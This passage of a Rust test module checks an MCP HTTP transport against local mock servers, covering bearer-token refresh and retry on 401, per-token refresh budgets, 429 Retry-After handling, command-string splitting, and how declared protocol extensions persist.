                        .map(|h| h.value.as_str().to_string())
                        .unwrap_or_default();
                    let _ = req.respond(
                        tiny_http::Response::from_string("{}").with_status_code(202),
                    );
                }
            }
        });

        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
            if force {
                Ok(Some("fresh".to_string()))
            } else {
                Ok(None)
            }
        }));
        let url = format!("http://127.0.0.1:{port}/");
        let mut transport =
            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);

        transport
            .send_post_no_response(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": 99,
                "result": { "roots": [] }
            }))
            .expect("inline reply should refresh and retry");
        handle.join().unwrap();

        assert_eq!(hits.load(Ordering::SeqCst), 2);
        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh");
    }

    #[test]
    fn post_refreshes_token_and_retries_on_401() {
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::{Arc, Mutex};

        // Mock MCP server: 401 on the first POST (token expired), 200 JSON-RPC on
        // the retry. Record the Authorization header on the second request.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let retry_auth = Arc::new(Mutex::new(String::new()));
        let hits = Arc::new(AtomicUsize::new(0));
        let (ra, hc) = (Arc::clone(&retry_auth), Arc::clone(&hits));
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = match server.recv() {
                    Ok(r) => r,
                    Err(_) => return,
                };
                let auth = req
                    .headers()
                    .iter()
                    .find(|h| h.field.equiv("Authorization"))
                    .map(|h| h.value.as_str().to_string())
                    .unwrap_or_default();
                if hc.fetch_add(1, Ordering::SeqCst) == 0 {
                    let _ = req.respond(
                        tiny_http::Response::from_string("unauthorized").with_status_code(401),
                    );
                } else {
                    *ra.lock().unwrap() = auth;
                    let ct =
                        tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                            .unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let refresh: Option<RefreshFn> = Some(Box::new(|force| {
            if force {
                Ok(Some("fresh".to_string()))
            } else {
                Ok(None)
            }
        }));
        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        let res = t
            .post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true)
            .expect("post should succeed after the token refresh");
        handle.join().unwrap();

        assert!(res.is_some(), "got the 200 result after refreshing");
        assert_eq!(hits.load(Ordering::SeqCst), 2, "exactly one 401 then one retry");
        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh", "retry used the new token");
    }

    #[test]
    fn forced_refresh_is_budgeted_per_token_not_per_post() {
        // Connect posts twice: `initialize`, then the `server/discover` era probe.
        // With a per-call budget each POST ran its own 401 -> refresh -> retry
        // cycle, so one expired token cost two refresh exchanges - and a provider
        // that rotates the refresh token on use has that chain consumed twice
        // (SOU-474 #5). The budget belongs to the token, not the call.
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        // Always 401: the refreshed token is rejected too, so nothing can succeed
        // and the only question is how many times we tried to mint a new one.
        //
        // Serve until told to stop rather than for a fixed number of requests: a
        // regression makes MORE requests, and a fixed loop would leave the extra
        // one unanswered and hang the client instead of failing the assertion.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let posts = Arc::new(AtomicUsize::new(0));
        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let (pc, sc) = (Arc::clone(&posts), Arc::clone(&stop));
        let handle = std::thread::spawn(move || {
            while !sc.load(Ordering::SeqCst) {
                match server.recv_timeout(std::time::Duration::from_millis(50)) {
                    Ok(Some(req)) => {
                        pc.fetch_add(1, Ordering::SeqCst);
                        let _ = req.respond(
                            tiny_http::Response::from_string("nope").with_status_code(401),
                        );
                    }
                    Ok(None) => continue,
                    Err(_) => return,
                }
            }
        });

        let forced = Arc::new(AtomicUsize::new(0));
        let fc = Arc::clone(&forced);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            if force {
                // Each forced call is a refresh-token exchange with the provider.
                let n = fc.fetch_add(1, Ordering::SeqCst);
                Ok(Some(format!("minted-{n}")))
            } else {
                Ok(None)
            }
        }));

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" });
        assert!(t.post(&body, true).is_err(), "an always-401 server cannot succeed");
        // The second POST is the era probe, on the same transport and the same
        // (already once-refreshed) token.
        assert!(t.post(&body, true).is_err(), "still 401");
        drop(t);
        stop.store(true, Ordering::SeqCst);
        let _ = handle.join();

        assert_eq!(
            forced.load(Ordering::SeqCst),
            1,
            "one expired token must cost exactly one refresh exchange across both POSTs"
        );
        // 401, refresh, 401(retry) on the first post; the second post sends once
        // and gives up without minting anything.
        assert_eq!(posts.load(Ordering::SeqCst), 3, "no retry on the second POST");
    }

    #[test]
    fn an_accepted_token_returns_its_forced_refresh_budget() {
        // The per-token budget must be a budget, not a latch. A provider that
        // omits `expires_in` has no deadline, so `refresh_before_send` never
        // fires and `auth` can only ever change via a FORCED refresh. Keying the
        // budget to the token and clearing it only on a proactive swap therefore
        // wedged the connection: after one successful reactive refresh, the next
        // expiry 401s forever with a working refresh token sitting in the vault.
        //
        // `Fatal` is not a health failure, so the breaker never trips and nothing
        // reconnects - every later call to that server fails for the life of the
        // process. Clearing on 2xx is what makes it recoverable (SOU-474 review).
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        // Models a short-lived token: a freshly minted one works exactly once and
        // is stale by the next request, so two successive expiries occur with no
        // `expires_in` for the proactive path to act on.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let sc = Arc::clone(&stop);
        let handle = std::thread::spawn(move || {
            let mut spent: std::collections::HashSet<String> = std::collections::HashSet::new();
            while !sc.load(Ordering::SeqCst) {
                let req = match server.recv_timeout(std::time::Duration::from_millis(50)) {
                    Ok(Some(req)) => req,
                    Ok(None) => continue,
                    Err(_) => return,
                };
                let auth = req
                    .headers()
                    .iter()
                    .find(|h| h.field.equiv("Authorization"))
                    .map(|h| h.value.as_str().to_string())
                    .unwrap_or_default();
                if auth.starts_with("Bearer minted-") && spent.insert(auth.clone()) {
                    let ct = tiny_http::Header::from_bytes(
                        &b"Content-Type"[..],
                        &b"application/json"[..],
                    )
                    .unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                } else {
                    let _ = req
                        .respond(tiny_http::Response::from_string("nope").with_status_code(401));
                }
            }
        });

        let forced = Arc::new(AtomicUsize::new(0));
        let fc = Arc::clone(&forced);
        // No proactive deadline: the non-forced arm always declines, exactly like
        // a provider that reported no `expires_in`.
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            if force {
                let n = fc.fetch_add(1, Ordering::SeqCst);
                Ok(Some(format!("minted-{n}")))
            } else {
                Ok(None)
            }
        }));

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" });

        // First expiry: 401, forced refresh to minted-0, retry accepted.
        assert!(t.post(&body, true).is_ok(), "first reactive refresh recovers");
        // The accepted token is now stale at the provider (it is not minted-1),
        // so this 401s. The budget must be available again to recover.
        assert!(
            t.post(&body, true).is_ok(),
            "a second expiry must still be recoverable; the budget latched shut"
        );
        drop(t);
        stop.store(true, Ordering::SeqCst);
        let _ = handle.join();

        assert_eq!(
            forced.load(Ordering::SeqCst),
            2,
            "one forced exchange per expiry, and the second must actually happen"
        );
    }

    #[test]
    fn proactive_refresh_restores_the_forced_budget() {
        // The per-token budget must not become a permanent latch: once a proactive
        // refresh swaps in a *different* token, a later 401 on that new token is a
        // genuine expiry and must still be recoverable, or a long-lived session
        // stops self-healing (SOU-474 #5).
        use super::{HttpTransport, RefreshFn};
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let hits = Arc::new(AtomicUsize::new(0));
        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let (hc, sc) = (Arc::clone(&hits), Arc::clone(&stop));
        let handle = std::thread::spawn(move || {
            while !sc.load(Ordering::SeqCst) {
                let req = match server.recv_timeout(std::time::Duration::from_millis(50)) {
                    Ok(Some(req)) => req,
                    Ok(None) => continue,
                    Err(_) => return,
                };
                // 401 every request except the very last one we expect.
                if hc.fetch_add(1, Ordering::SeqCst) == 3 {
                    let ct = tiny_http::Header::from_bytes(
                        &b"Content-Type"[..],
                        &b"application/json"[..],
                    )
                    .unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                } else {
                    let _ = req
                        .respond(tiny_http::Response::from_string("nope").with_status_code(401));
                }
            }
        });

        let forced = Arc::new(AtomicUsize::new(0));
        let fc = Arc::clone(&forced);
        let proactive = Arc::new(AtomicUsize::new(0));
        let pc = Arc::clone(&proactive);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            if force {
                let n = fc.fetch_add(1, Ordering::SeqCst);
                Ok(Some(format!("forced-{n}")))
            } else if pc.fetch_add(1, Ordering::SeqCst) == 1 {
                // Before the second POST, hand out a genuinely different token.
                Ok(Some("proactive".to_string()))
            } else {
                Ok(None)
            }
        }));

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" });
        assert!(t.post(&body, true).is_err(), "first POST exhausts its budget");
        assert!(
            t.post(&body, true).is_ok(),
            "a proactively-refreshed token gets its own forced-refresh budget"
        );
        drop(t);
        stop.store(true, Ordering::SeqCst);
        let _ = handle.join();

        assert_eq!(
            forced.load(Ordering::SeqCst),
            2,
            "one forced exchange per distinct token, not one for the whole connection"
        );
    }

    #[test]
    fn post_returns_retry_on_429_with_retry_after() {
        use super::{HttpTransport, TransportError};
        use std::sync::Arc;
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::time::Duration;

        // Mock MCP server: 429 with Retry-After: 2 on the first request,
        // 200 JSON-RPC on the second.
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let hits = Arc::new(AtomicUsize::new(0));
        let hc = Arc::clone(&hits);
        let handle = std::thread::spawn(move || {
            for _ in 0..2 {
                let req = match server.recv() {
                    Ok(r) => r,
                    Err(_) => return,
                };
                if hc.fetch_add(1, Ordering::SeqCst) == 0 {
                    let ra = tiny_http::Header::from_bytes(&b"Retry-After"[..], &b"2"[..]).unwrap();
                    let _ = req.respond(
                        tiny_http::Response::from_string("rate limited")
                            .with_status_code(429)
                            .with_header(ra),
                    );
                } else {
                    let ct = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..]).unwrap();
                    let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                    let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::new(&url);

        // First call: should get a Retry signal, NOT an Ok or Fatal.
        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
        match &result {
            Err(TransportError::Retry { retry_after, .. }) => {
                assert_eq!(*retry_after, Some(Duration::from_secs(2)));
            }
            other => panic!("expected TransportError::Retry, got {other:?}"),
        }

        // Second call: the server now responds 200.
        let result2 = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 2, "method": "ping" }), true);
        assert!(result2.is_ok(), "second call should succeed: {result2:?}");
        assert_eq!(hits.load(Ordering::SeqCst), 2);

        handle.join().unwrap();
    }

    #[test]
    fn normalize_invocation_splits_unsplit_command() {
        use super::normalize_invocation;
        let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        // The bug case: whole invocation packed into `command`, empty args.
        assert_eq!(
            normalize_invocation("npx -y @modelcontextprotocol/server-github", &[]),
            ("npx".into(), s(&["-y", "@modelcontextprotocol/server-github"])),
        );
        // Args with slashes (a package path or a filesystem root) survive the split.
        assert_eq!(
            normalize_invocation("npx -y @scope/fs /srv", &[]),
            ("npx".into(), s(&["-y", "@scope/fs", "/srv"])),
        );
        // Already-split configs are untouched.
        assert_eq!(
            normalize_invocation("npx", &s(&["-y", "pkg"])),
            ("npx".into(), s(&["-y", "pkg"])),
        );
        // A bare command with no args stays bare.
        assert_eq!(normalize_invocation("uvx", &[]), ("uvx".into(), vec![]));
        // A real executable path (has a slash) is never split, even with spaces.
        assert_eq!(
            normalize_invocation("/usr/bin/my tool", &[]),
            ("/usr/bin/my tool".into(), vec![]),
        );
    }

    #[test]
    fn post_returns_retry_on_transport_error() {
        use super::{HttpTransport, TransportError};

        // A dead port: connection refused, which is a retryable transport error.
        let mut t = HttpTransport::new("http://127.0.0.1:1/");
        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
        match &result {
            Err(TransportError::Retry { retry_after, .. }) => {
                assert!(retry_after.is_none());
            }
            Err(TransportError::Fatal(msg)) => {
                // On some systems port 1 may produce a different error class.
                eprintln!("got Fatal instead of Retry (OS-dependent): {msg}");
            }
            other => panic!("expected Retry or Fatal, got {other:?}"),
        }
    }

    /// SBS-524: a declared extension must survive `set_protocol_meta`.
    ///
    /// Version negotiation replaces `protocol_meta` wholesale, and the declaration
    /// is made at connect time, before negotiation. Storing it only inside
    /// `protocol_meta` would drop it on the first modern handshake and the server
    /// would never learn the flow was in use -- with nothing failing to say so.
    #[test]
    fn declared_extensions_survive_protocol_meta_replacement() {
        let mut transport = HttpTransport::guarded("https://mcp.example.com/mcp", None, None, true);
        transport.declare_extension(OAUTH_CLIENT_CREDENTIALS_EXTENSION, json!({}));

        // Declared before there is any protocol meta: nothing to merge into yet.
        assert!(transport.protocol_meta.is_none());

        transport.set_protocol_meta(Some(protocol_meta_for("2026-07-28")));
        let extensions = transport
            .protocol_meta
            .as_ref()
            .and_then(|m| m.get("io.modelcontextprotocol/clientCapabilities"))
            .and_then(|c| c.get("extensions"))
            .and_then(Value::as_object)
            .expect("modern meta must carry a clientCapabilities.extensions map");
        assert!(
            extensions.contains_key(OAUTH_CLIENT_CREDENTIALS_EXTENSION),
            "the declaration was dropped by version negotiation: {extensions:?}"
        );

        // Re-negotiating (a second handshake on the same transport) keeps it.
        transport.set_protocol_meta(Some(protocol_meta_for("2026-07-28")));
        assert!(transport
            .protocol_meta
            .as_ref()
            .and_then(|m| m.get("io.modelcontextprotocol/clientCapabilities"))
            .and_then(|c| c.get("extensions"))
            .and_then(Value::as_object)
            .is_some_and(|e| e.contains_key(OAUTH_CLIENT_CREDENTIALS_EXTENSION)));
    }

    /// A connection that never declares anything must send exactly what it always
    /// did, so this cannot leak an empty `extensions` map onto every server.
    #[test]
    fn undeclared_connections_send_unchanged_meta() {
        let mut transport = HttpTransport::guarded("https://mcp.example.com/mcp", None, None, true);
        transport.set_protocol_meta(Some(protocol_meta_for("2026-07-28")));
        assert_eq!(
            transport.protocol_meta.as_ref().unwrap(),
            &protocol_meta_for("2026-07-28"),
            "declaring nothing must not alter the standard per-request meta"
        );
    }
}
